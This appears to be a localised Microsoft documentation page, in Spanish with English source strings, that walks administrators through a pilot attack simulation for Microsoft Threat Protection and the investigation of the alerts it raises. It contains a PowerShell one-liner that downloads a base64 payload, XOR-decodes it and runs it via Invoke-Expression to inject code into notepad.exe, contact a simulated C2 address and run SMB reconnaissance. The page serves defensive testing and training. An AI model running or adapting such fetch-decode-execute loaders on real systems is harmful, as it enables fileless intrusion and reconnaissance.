---
title: Ejecutar las simulaciones de ataque de la protección contra amenazas de Microsoft
description: Ejecute simulaciones de ataque para su proyecto piloto de Microsoft Threat Protection para ver cómo se despliega y se dirige rápidamente.
keywords: Simulación de ataques de Microsoft Threat Protection Pilot, ejecución de la simulación de ataques de Microsoft Threat Protection Pilot, simular un ataque en Microsoft Threat Protection, Microsoft Threat Protection Pilot Project, Cyber Security, prevención avanzada contra amenazas persistentes, seguridad empresarial, dispositivos, dispositivo, identidad, usuarios, datos, aplicaciones, incidentes, investigación automatizada y corrección, búsqueda avanzada
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-evalutatemtp
ms.topic: conceptual
ms.openlocfilehash: e6cf01f5540e383fb56e387cd07b455741221dc5
ms.sourcegitcommit: 9d8d071659e662c266b101377e24549963e43fef
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 10/06/2020
ms.locfileid: "48368098"
---
# <a name="run-your-microsoft-threat-protection-attack-simulations"></a><span data-ttu-id="194f4-104">Ejecutar las simulaciones de ataque de la protección contra amenazas de Microsoft</span><span class="sxs-lookup"><span data-stu-id="194f4-104">Run your Microsoft Threat Protection attack simulations</span></span>  

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


<span data-ttu-id="194f4-105">**Se aplica a:**</span><span class="sxs-lookup"><span data-stu-id="194f4-105">**Applies to:**</span></span>
- <span data-ttu-id="194f4-106">Protección contra amenazas de Microsoft</span><span class="sxs-lookup"><span data-stu-id="194f4-106">Microsoft Threat Protection</span></span>
<br>
<table border="0" width="100%" align="center">
  <tr style="text-align:center;">
    <td align="center" style="width:25%; border:0;" >
      <a href= "https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-plan"> 
        <img src="../../media/mtp/plan.png" alt="Plan your pilot Microsoft Threat Protection project" title="Planear el proyecto piloto de Microsoft Threat Protection" />
      <br/><span data-ttu-id="194f4-108">Pensado </a></span><span class="sxs-lookup"><span data-stu-id="194f4-108">Plan </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/prepare-mtpeval">
        <img src="../../media/mtp/prep.png" alt="Prepare your Microsoft Threat Protection trial lab or pilot environment" title="Preparar el entorno piloto o el laboratorio de pruebas de Microsoft Threat Protection" />
      <br/><span data-ttu-id="194f4-110">Párelo </a></span><span class="sxs-lookup"><span data-stu-id="194f4-110">Prepare </a></span></span><br>
    </td>
    <td align="center"bgcolor="#d5f5e3">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-simulate">
        <img src="../../media/mtp/run-sim.png" alt="Run your Microsoft Threat Protection attack simulations" title="Ejecutar las simulaciones de ataque de la protección contra amenazas de Microsoft" />
      <br/><span data-ttu-id="194f4-112">Simular ataque </a></span><span class="sxs-lookup"><span data-stu-id="194f4-112">Simulate attack </a></span></span><br>
    </td>
    <td align="center">
      <a href="https://docs.microsoft.com/microsoft-365/security/mtp/mtp-pilot-close">
        <img src="../../media/mtp/close.png" alt="Close and summarize your Microsoft Threat Protection pilot" title="Cierre y resuma el piloto de Microsoft Threat Protection" />
      <br/><span data-ttu-id="194f4-114">Cerrar y resumir </a></span><span class="sxs-lookup"><span data-stu-id="194f4-114">Close and summarize </a></span></span><br>
    </td>
  </tr>
  <tr>
    <td style="width:25%; border:0;">
   
    </td>
    <td valign="top" style="width:25%; border:0;">
    
</td>
    <td valign="top" style="width:25%; border:0;">

</td>    
    <td valign="top" style="width:25%; border:0;">

</td>
  </tr>
</table>

<span data-ttu-id="194f4-115">Actualmente está en la fase de simulación de ataques.</span><span class="sxs-lookup"><span data-stu-id="194f4-115">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="194f4-116">Después de preparar el entorno piloto, es el momento de probar la administración de incidentes de Microsoft Threat Protection y las capacidades automatizadas de investigación y corrección.</span><span class="sxs-lookup"><span data-stu-id="194f4-116">After preparing your pilot environment, it’s time to test the Microsoft Threat Protection incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="194f4-117">Le ayudaremos a simular un ataque complejo que aprovecha las técnicas avanzadas para ocultarse de la detección.</span><span class="sxs-lookup"><span data-stu-id="194f4-117">We will help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="194f4-118">El ataque enumera las sesiones del bloque de mensajes del servidor (SMB) abiertas en los controladores de dominio y recupera las direcciones IP recientes de los dispositivos de los usuarios.</span><span class="sxs-lookup"><span data-stu-id="194f4-118">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users’ devices.</span></span> <span data-ttu-id="194f4-119">Esta categoría de ataques no suele incluir los archivos ubicados en el dispositivo de la víctima, sino que se producen únicamente en la memoria.</span><span class="sxs-lookup"><span data-stu-id="194f4-119">This category of attacks usually doesn’t include files dropped on the victim’s device—they occur solely in memory.</span></span> <span data-ttu-id="194f4-120">Se "desconectan" del terreno usando herramientas administrativas y del sistema existentes e insertan su código en procesos de sistema para ocultar su ejecución, lo que les permite eludir la detección y persisten en el dispositivo.</span><span class="sxs-lookup"><span data-stu-id="194f4-120">They “live off the land” by using existing system and administrative tools and inject their code into system processes to hide their execution, allowing them to evade detection and persist on the device.</span></span>

<span data-ttu-id="194f4-121">En esta simulación, nuestro escenario de ejemplo comienza con un script de PowerShell.</span><span class="sxs-lookup"><span data-stu-id="194f4-121">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="194f4-122">Se puede engañar a un usuario para que ejecute un script.</span><span class="sxs-lookup"><span data-stu-id="194f4-122">A user might be tricked into running a script.</span></span> <span data-ttu-id="194f4-123">O la secuencia de comandos puede ejecutarse desde una conexión remota a otro equipo desde un dispositivo previamente infectado: el atacante intenta moverse más adelante en la red.</span><span class="sxs-lookup"><span data-stu-id="194f4-123">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="194f4-124">La detección de estos scripts puede ser difícil porque los administradores también suelen ejecutar scripts de forma remota para llevar a cabo varias actividades administrativas.</span><span class="sxs-lookup"><span data-stu-id="194f4-124">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Ataque de PowerShell sin archivo con diagrama de ataque de inserción de proceso y Reconnaisance de SMB](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="194f4-126">Durante la simulación, el ataque inyecta shellcode en un proceso aparentemente inocente.</span><span class="sxs-lookup"><span data-stu-id="194f4-126">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="194f4-127">En este escenario, usaremos notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="194f4-127">In this scenario, we’ll use notepad.exe.</span></span> <span data-ttu-id="194f4-128">Elegimos este proceso para la simulación, pero es más probable que los atacantes se destinen a un proceso del sistema de ejecución prolongada, como svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="194f4-128">We chose this process for the simulation, but attackers will more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="194f4-129">A continuación, el shellcode se pone en contacto con el servidor de comandos y control (C2) del atacante para recibir instrucciones sobre cómo continuar.</span><span class="sxs-lookup"><span data-stu-id="194f4-129">The shellcode then goes on to contact the attacker’s command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="194f4-130">Además, el script intenta ejecutar consultas de reconocimiento en el controlador de dominio (DC).</span><span class="sxs-lookup"><span data-stu-id="194f4-130">In addition, the script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="194f4-131">Esto permite a un atacante obtener información sobre la información de inicio de sesión del usuario reciente.</span><span class="sxs-lookup"><span data-stu-id="194f4-131">This allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="194f4-132">Una vez que los atacantes tengan esta información, pueden avanzar más adelante en la red para llegar a una cuenta sensible específica</span><span class="sxs-lookup"><span data-stu-id="194f4-132">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

>[!IMPORTANT]
><span data-ttu-id="194f4-133">Para obtener resultados óptimos, siga las instrucciones de simulación de ataque lo más parecida posible.</span><span class="sxs-lookup"><span data-stu-id="194f4-133">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>


## <a name="simulation-environment-requirements"></a><span data-ttu-id="194f4-134">Requisitos del entorno de simulación</span><span class="sxs-lookup"><span data-stu-id="194f4-134">Simulation environment requirements</span></span>

<span data-ttu-id="194f4-135">Como ya ha configurado el entorno piloto durante la fase de preparación, asegúrese de que dispone de dos dispositivos para este escenario: un dispositivo de prueba y un controlador de dominio.</span><span class="sxs-lookup"><span data-stu-id="194f4-135">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1.  <span data-ttu-id="194f4-136">Compruebe que el inquilino haya [habilitado Microsoft Threats](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)para la protección contra amenazas de Microsoft.</span><span class="sxs-lookup"><span data-stu-id="194f4-136">Verify your tenant has [enabled Microsoft Threat Microsoft Threat Protection](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service)￼￼.</span></span>
2.  <span data-ttu-id="194f4-137">Compruebe la configuración del controlador de dominio de prueba:</span><span class="sxs-lookup"><span data-stu-id="194f4-137">Verify your test domain controller configuration:</span></span>
    - <span data-ttu-id="194f4-138">El dispositivo se ejecuta con Windows Server 2008 R2 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="194f4-138">Device runs with Windows Server 2008 R2 or a later version.</span></span>
    - <span data-ttu-id="194f4-139">El controlador de dominio de prueba a la [protección contra amenazas avanzada de Azure](https://docs.microsoft.com/azure/security-center/security-center-wdatp) y habilitar la [administración remota](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span><span class="sxs-lookup"><span data-stu-id="194f4-139">The test domain controller to [Azure Advanced Threat Protection](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>    
    - <span data-ttu-id="194f4-140">Compruebe que [Azure ATP y la integración de Microsoft Cloud App Security](https://docs.microsoft.com/cloud-app-security/aatp-integration) se han habilitado.</span><span class="sxs-lookup"><span data-stu-id="194f4-140">Verify that [Azure ATP and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/aatp-integration) have been enabled.</span></span>
    - <span data-ttu-id="194f4-141">Se crea un usuario de prueba en el dominio; no se necesitan permisos de administrador.</span><span class="sxs-lookup"><span data-stu-id="194f4-141">A test user is created on your domain – no admin permissions needed.</span></span>

3.  <span data-ttu-id="194f4-142">Compruebe la configuración del dispositivo de prueba:</span><span class="sxs-lookup"><span data-stu-id="194f4-142">Verify test device configuration:</span></span>
    <br>
    <span data-ttu-id="194f4-143">a.</span><span class="sxs-lookup"><span data-stu-id="194f4-143">a.</span></span>  <span data-ttu-id="194f4-144">El dispositivo se ejecuta con Windows 10 versión 1903 o una versión posterior.</span><span class="sxs-lookup"><span data-stu-id="194f4-144">Device runs with Windows 10 version 1903 or a later version.</span></span>
    <br>
    <span data-ttu-id="194f4-145">b.</span><span class="sxs-lookup"><span data-stu-id="194f4-145">b.</span></span>  <span data-ttu-id="194f4-146">El dispositivo de prueba se une al dominio de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-146">Test device is joined to the test domain.</span></span>
    <br>
    <span data-ttu-id="194f4-147">c.</span><span class="sxs-lookup"><span data-stu-id="194f4-147">c.</span></span>  <span data-ttu-id="194f4-148">[Activa el antivirus de Windows Defender](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="194f4-148">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="194f4-149">Si tienes problemas para habilitar antivirus de Windows Defender, consulta este [tema de solución de problemas](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="194f4-149">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <br>
    <span data-ttu-id="194f4-150">d.</span><span class="sxs-lookup"><span data-stu-id="194f4-150">d.</span></span>  <span data-ttu-id="194f4-151">Compruebe que el dispositivo de prueba se [incorpora a la protección contra amenazas avanzada de Microsoft defender (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="194f4-151">Verify that the test device is [onboarded to Microsoft Defender Advanced Threat Protection (MDATP)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="194f4-152">Si usa un inquilino existente e implementa grupos de dispositivos, cree un grupo de dispositivos dedicado para el dispositivo de prueba y arrástrelo al nivel superior de la experiencia de usuario de configuración.</span><span class="sxs-lookup"><span data-stu-id="194f4-152">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>


## <a name="run-the-simulation"></a><span data-ttu-id="194f4-153">Ejecutar la simulación</span><span class="sxs-lookup"><span data-stu-id="194f4-153">Run the simulation</span></span>

<span data-ttu-id="194f4-154">Para ejecutar la simulación de escenario de ataque:</span><span class="sxs-lookup"><span data-stu-id="194f4-154">To run the attack scenario simulation:</span></span>

1.  <span data-ttu-id="194f4-155">Inicie sesión en el dispositivo de prueba con la cuenta de usuario de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-155">Log in to the test device with the test user account.</span></span>

2.  <span data-ttu-id="194f4-156">Abra una ventana de Windows PowerShell en el dispositivo de prueba.</span><span class="sxs-lookup"><span data-stu-id="194f4-156">Open a Windows PowerShell window on the test device.</span></span>

3.  <span data-ttu-id="194f4-157">Copie el siguiente script de simulación:</span><span class="sxs-lookup"><span data-stu-id="194f4-157">Copy the following simulation script:</span></span>
```
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
= [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
-UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
$decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
$i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
```
>[!NOTE]
><span data-ttu-id="194f4-158">Si abre este documento en un explorador Web, es posible que surjan problemas para copiar el texto completo sin perder determinados caracteres o introducir saltos de línea adicionales.</span><span class="sxs-lookup"><span data-stu-id="194f4-158">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="194f4-159">Descargue este documento y ábralo en Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="194f4-159">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="194f4-160">En el símbolo del sistema, pegue y ejecute el script copiado.</span><span class="sxs-lookup"><span data-stu-id="194f4-160">At the prompt, paste and run the copied script.</span></span>

>[!NOTE]
><span data-ttu-id="194f4-161">Si está ejecutando PowerShell con el protocolo de escritorio remoto (RDP), use el comando tipo de texto del portapapeles en el cliente RDP porque es posible que la tecla de método rápido **Ctrl-V** o el método de pegar clic con el botón secundario no funcionen.</span><span class="sxs-lookup"><span data-stu-id="194f4-161">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span>  <span data-ttu-id="194f4-162">Las versiones recientes de PowerShell también no aceptarán ese método, es posible que deba copiar en la memoria el Bloc de notas en primer lugar, copiarlo en la máquina virtual y, a continuación, pegarlo en PowerShell.</span><span class="sxs-lookup"><span data-stu-id="194f4-162">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="194f4-163">Unos segundos más tarde, se abrirá <i>notepad.exe</i> .</span><span class="sxs-lookup"><span data-stu-id="194f4-163">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="194f4-164">Un código de ataque simulado se insertará en notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="194f4-164">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="194f4-165">Mantenga abierta la instancia de Bloc de notas generada automáticamente para experimentar todo el escenario.</span><span class="sxs-lookup"><span data-stu-id="194f4-165">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="194f4-166">El código de ataque simulado intentará comunicarse con una dirección IP externa (simulando el servidor C2) y, a continuación, intentará el reconocimiento con el controlador de dominio a través de SMB.</span><span class="sxs-lookup"><span data-stu-id="194f4-166">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="194f4-167">Verá un mensaje mostrado en la consola de PowerShell cuando se complete este script.</span><span class="sxs-lookup"><span data-stu-id="194f4-167">You will see a message displayed on the PowerShell console when this script completes.</span></span>

```
ran NetSessionEnum against [DC Name] with return code result 0      
```

<span data-ttu-id="194f4-168">Para ver la característica de respuesta y incidente automatizada en acción, mantenga abierto el proceso de notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="194f4-168">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="194f4-169">Verá que el incidente y la respuesta automatizadas detienen el proceso de Bloc de notas.</span><span class="sxs-lookup"><span data-stu-id="194f4-169">You will see Automated Incident and Response stop the Notepad process.</span></span>


## <a name="investigate-an-incident"></a><span data-ttu-id="194f4-170">Investigar un incidente</span><span class="sxs-lookup"><span data-stu-id="194f4-170">Investigate an incident</span></span>

>[!NOTE]
><span data-ttu-id="194f4-171">Antes de guiarle a través de esta simulación, vea el siguiente vídeo para ver cómo la administración de incidentes le ayuda a relacionar las alertas relacionadas como parte del proceso de investigación, dónde puede encontrarla en el portal y cómo puede ayudarle en las operaciones de seguridad:</span><span class="sxs-lookup"><span data-stu-id="194f4-171">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

>[!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="194f4-172">Al cambiar al punto de vista del analista de SOC, ahora puede empezar a investigar el ataque en el portal del centro de seguridad de Microsoft 365.</span><span class="sxs-lookup"><span data-stu-id="194f4-172">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span> 

1.  <span data-ttu-id="194f4-173">Abra la cola de incidentes del [Portal del centro de seguridad 365 de Microsoft](https://security.microsoft.com/incidents) desde cualquier dispositivo.</span><span class="sxs-lookup"><span data-stu-id="194f4-173">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2.  <span data-ttu-id="194f4-174">Vaya a **incidentes** en el menú.</span><span class="sxs-lookup"><span data-stu-id="194f4-174">Navigate to **Incidents** from the menu.</span></span> 

    ![Captura de pantalla de incidentes como se muestra en el menú del lado izquierdo de centro de seguridad 365 de Microsoft](../../media/mtp/fig1.png)

3.  <span data-ttu-id="194f4-176">El nuevo incidente para el ataque simulado aparecerá en la cola de incidentes.</span><span class="sxs-lookup"><span data-stu-id="194f4-176">The new incident for the simulated attack will appear in the incident queue.</span></span>
 
    ![Captura de pantalla de la cola de incidentes](../../media/mtp/fig2.png)


### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="194f4-178">Investigar el ataque como un incidente único</span><span class="sxs-lookup"><span data-stu-id="194f4-178">Investigate the attack as a single incident</span></span>

<span data-ttu-id="194f4-179">La protección contra amenazas de Microsoft correlaciona los análisis y agrega todas las alertas y investigaciones relacionadas de distintos productos en una entidad incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-179">Microsoft Threat Protection correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="194f4-180">Al hacerlo, Microsoft Threat Protection muestra una historia de ataque más amplia, lo que permite que el analista de SOC comprenda y responda a amenazas complejas.</span><span class="sxs-lookup"><span data-stu-id="194f4-180">By doing so, Microsoft Threat Protection shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="194f4-181">Las alertas generadas durante esta simulación están asociadas con la misma amenaza y, como resultado, se agregan automáticamente como un único incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-181">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="194f4-182">Para ver el incidente:</span><span class="sxs-lookup"><span data-stu-id="194f4-182">To view the incident:</span></span>

1.  <span data-ttu-id="194f4-183">Navegue a la cola **incidentes** .</span><span class="sxs-lookup"><span data-stu-id="194f4-183">Navigate to the **Incidents** queue.</span></span>
 
    ![Captura de pantalla de incidentes desde el menú de navegación](../../media/mtp/fig1.png)

2.  <span data-ttu-id="194f4-185">Seleccione el elemento más reciente haciendo clic en el círculo situado a la izquierda del nombre del incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-185">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="194f4-186">Un panel lateral muestra información adicional sobre el incidente, incluidas todas las alertas relacionadas.</span><span class="sxs-lookup"><span data-stu-id="194f4-186">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="194f4-187">Cada incidente tiene un nombre único que lo describe en función de los atributos de las alertas que incluye.</span><span class="sxs-lookup"><span data-stu-id="194f4-187">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

    ![Captura de pantalla de la página incidentes donde se agregan alertas generadas durante la simulación](../../media/mtp/fig4.png)

    <span data-ttu-id="194f4-189">Las alertas que se muestran en el panel se pueden filtrar en función de los recursos de servicio: ATP de Azure, seguridad de aplicación de nube de Microsoft, ATP de Microsoft defender, protección contra amenazas de Microsoft y ATP de Office.</span><span class="sxs-lookup"><span data-stu-id="194f4-189">The alerts that shows in the dashboard can be filtered based on service resources: Azure ATP, Microsoft Cloud App Security, Microsoft Defender ATP, Microsoft Threat Protection, and Office ATP.</span></span>  

3.  <span data-ttu-id="194f4-190">Seleccione **abrir página incidente** para obtener más información sobre el incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-190">Select **Open incident page** to get more information about the incident.</span></span>

    <span data-ttu-id="194f4-191">En la página **incidente** , puede ver todas las alertas y la información relacionada con el incidente.</span><span class="sxs-lookup"><span data-stu-id="194f4-191">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="194f4-192">Esto incluye las entidades y los activos implicados en la alerta, el origen de detección de las alertas (ATP ATP, EDR) y el motivo por el que se vincularon entre sí.</span><span class="sxs-lookup"><span data-stu-id="194f4-192">This includes the entities and assets that are involved in the alert, the detection source of the alerts (Azure ATP, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="194f4-193">Revisar la lista de alertas de incidentes muestra la progresión del ataque.</span><span class="sxs-lookup"><span data-stu-id="194f4-193">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="194f4-194">Desde esta vista, puede ver e investigar las alertas individuales.</span><span class="sxs-lookup"><span data-stu-id="194f4-194">From this view, you can see and investigate the individual alerts.</span></span>

    <span data-ttu-id="194f4-195">También puede hacer clic en **administrar incidente** en el menú de la derecha, para etiquetar el incidente, asignarlo a sí mismo y agregar comentarios.</span><span class="sxs-lookup"><span data-stu-id="194f4-195">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

    ![Captura de pantalla de dónde hacer clic en administrar incidente](../../media/mtp/fig5a.png)

    ![<span data-ttu-id="194f4-197">Captura de pantalla de los campos del panel administrar incidente donde puede etiquetar el incidente, asignarlo a sí mismo y agregar comentarios</span><span class="sxs-lookup"><span data-stu-id="194f4-197">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)


### <a name="review-generated-alerts"></a><span data-ttu-id="194f4-198">Revisar las alertas generadas</span><span class="sxs-lookup"><span data-stu-id="194f4-198">Review generated alerts</span></span> 

<span data-ttu-id="194f4-199">Echemos un vistazo a algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="194f4-199">Let’s look at some of the alerts generated during the simulated attack.</span></span>

>[!NOTE]
><span data-ttu-id="194f4-200">Solo veremos algunas de las alertas generadas durante el ataque simulado.</span><span class="sxs-lookup"><span data-stu-id="194f4-200">We’ll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="194f4-201">En función de la versión de Windows y de los productos de Microsoft Threat Protection que se ejecutan en el dispositivo de prueba, es posible que vea más alertas que aparecen en un orden ligeramente diferente.</span><span class="sxs-lookup"><span data-stu-id="194f4-201">Depending on the version of Windows and the Microsoft Threat Protection products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Captura de pantalla de alertas generadas](../../media/mtp/fig6.png) 


<span data-ttu-id="194f4-203">**Alerta: se observó la inyección de procesos sospechoso (origen: ATP de Microsoft defender, EDR)**</span><span class="sxs-lookup"><span data-stu-id="194f4-203">**Alert: Suspicious process injection observed (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="194f4-204">Los atacantes avanzados usan métodos sofisticados e furtivos para persistir en la memoria y esconderse de las herramientas de detección.</span><span class="sxs-lookup"><span data-stu-id="194f4-204">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="194f4-205">Una técnica común es operar desde un proceso de sistema de confianza, en lugar de un archivo ejecutable malintencionado, lo que dificulta la detección de herramientas y operaciones de seguridad para detectar el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="194f4-205">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="194f4-206">Para permitir que los analistas de SOC detecten estos ataques avanzados, los sensores de memoria profunda en ATP de Microsoft defender proporcionan nuestro servicio en la nube con una visibilidad sin precedentes en una variedad de técnicas de inserción de código entre procesos.</span><span class="sxs-lookup"><span data-stu-id="194f4-206">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender ATP provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="194f4-207">En la siguiente figura se muestra cómo se ha detectado ATP de Microsoft defender y cómo se le advierte del intento de inyectar código para <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="194f4-207">The following figure shows how Microsoft Defender ATP detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Captura de pantalla de la alerta para inyección de código potencialmente malintencionado](../../media/mtp/fig7.png) 


<span data-ttu-id="194f4-209">**Alerta: comportamiento inesperado observado por un proceso ejecutar sin argumentos de línea de comandos (origen: ATP de Microsoft defender, EDR)**</span><span class="sxs-lookup"><span data-stu-id="194f4-209">**Alert: Unexpected behavior observed by a process run with no command line arguments (Source: Microsoft Defender ATP EDR)**</span></span>

<span data-ttu-id="194f4-210">Las detecciones de ATP de Microsoft defender a menudo atacan el atributo más común de una técnica de ataque.</span><span class="sxs-lookup"><span data-stu-id="194f4-210">Microsoft Defender ATP detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="194f4-211">Esto garantiza la durabilidad y eleva el bar para que los atacantes cambien a tácticas más recientes.</span><span class="sxs-lookup"><span data-stu-id="194f4-211">This ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="194f4-212">Empleamos algoritmos de aprendizaje a gran escala para establecer el comportamiento normal de los procesos comunes dentro de una organización y en todo el mundo, y deben observar Cuándo estos procesos presentan comportamientos anómalos.</span><span class="sxs-lookup"><span data-stu-id="194f4-212">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes exhibit anomalous behaviors.</span></span> <span data-ttu-id="194f4-213">Estos comportamientos anómalos suelen indicar que se ha incorporado código extraño y que se está ejecutando en un proceso de confianza de otro tipo.</span><span class="sxs-lookup"><span data-stu-id="194f4-213">These anomalous behaviors often indicate that extraneous code was introduced and is running in an otherwise trusted process.</span></span>

<span data-ttu-id="194f4-214">Para este escenario, el <i>notepad.exe</i> de proceso presenta un comportamiento anómalo, que implica la comunicación con una ubicación externa.</span><span class="sxs-lookup"><span data-stu-id="194f4-214">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="194f4-215">Este resultado es independiente del método específico que se usa para introducir y ejecutar el código malintencionado.</span><span class="sxs-lookup"><span data-stu-id="194f4-215">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

>[!NOTE]
